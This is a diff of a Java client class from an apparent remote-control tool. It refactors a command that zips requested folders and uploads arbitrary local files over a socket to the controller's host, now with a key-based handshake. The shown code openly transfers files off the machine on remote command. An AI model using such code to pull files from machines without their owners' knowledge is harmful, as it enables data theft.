@@ -6,7 +6,7 @@ package br.com.introcdc.connect.client.commands.file.external;
 import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.client.ConnectClient;
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.FileComponents;
+import br.com.introcdc.connect.client.components.ClientFileComponents;
 
 import java.io.BufferedInputStream;
 import java.io.DataOutputStream;
@@ -29,15 +29,15 @@ public class ClientCommandReceive extends ClientCommand {
         String[] filesArray = input.split(";");
         new Thread(() -> {
             for (String inputInfo : filesArray) {
-                File file = FileComponents.file(inputInfo);
+                File file = ClientFileComponents.file(inputInfo);
                 boolean temp = false;
                 boolean notFound = false;
                 if (file.exists()) {
                     if (file.isDirectory()) {
                         temp = true;
                         msg("Pasta " + file.getName() + " sendo zipada para recebimento...");
-                        File objective = FileComponents.ZIP_LOCAL ? new File("file.zip") : new File(FileComponents.FOLDER, "file.zip");
-                        FileComponents.createZip(file, objective, FileComponents.FOLDER.replace("\\", "/") + "/");
+                        File objective = ClientFileComponents.ZIP_LOCAL ? new File("file.zip") : new File(ClientFileComponents.FOLDER, "file.zip");
+                        ClientFileComponents.createZip(file, objective, ClientFileComponents.FOLDER.replace("\\", "/") + "/");
                         msg("Pasta " + file.getName() + " zipada!");
                         file = objective;
                     }
@@ -52,10 +52,11 @@ public class ClientCommandReceive extends ClientCommand {
                     msg("Enviando arquivo " + fileToSend.getName() + "...");
                     msg("receive-file");
                     Runnable runnable = () -> {
-                        try (Socket fileSocket = new Socket(Connect.IP, Connect.PORT + 3);
+                        try (Socket fileSocket = new Socket(Connect.IP, Connect.PORT);
                              DataOutputStream dos = new DataOutputStream(fileSocket.getOutputStream());
                              BufferedInputStream bis = new BufferedInputStream(new FileInputStream(fileToSend))) {
-                            dos.writeUTF(FileComponents.removeCharacters(fileToSend.getName()));
+                            dos.writeUTF("SECONDARY:" + ConnectClient.KEY + ":RECEIVE_FILE");
+                            dos.writeUTF(ClientFileComponents.removeCharacters(fileToSend.getName()));
                             dos.flush();
                             byte[] buffer = new byte[4096];
                             int bytesRead;
@@ -67,11 +68,11 @@ public class ClientCommandReceive extends ClientCommand {
                             exception(exception);
                         }
                         if (temporary) {
-                            FileComponents.deleteFile(fileToSend);
+                            ClientFileComponents.deleteFile(fileToSend);
                         }
                     };
                     if (filesArray.length == 1) {
-                        ConnectClient.EXECUTOR.schedule(() -> new Thread(runnable).start(), Connect.DELAY, Connect.DELAY_TYPE);
+                        ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> new Thread(runnable).start()), Connect.DELAY, Connect.DELAY_TYPE);
                     } else {
                         runnable.run();
                         try {
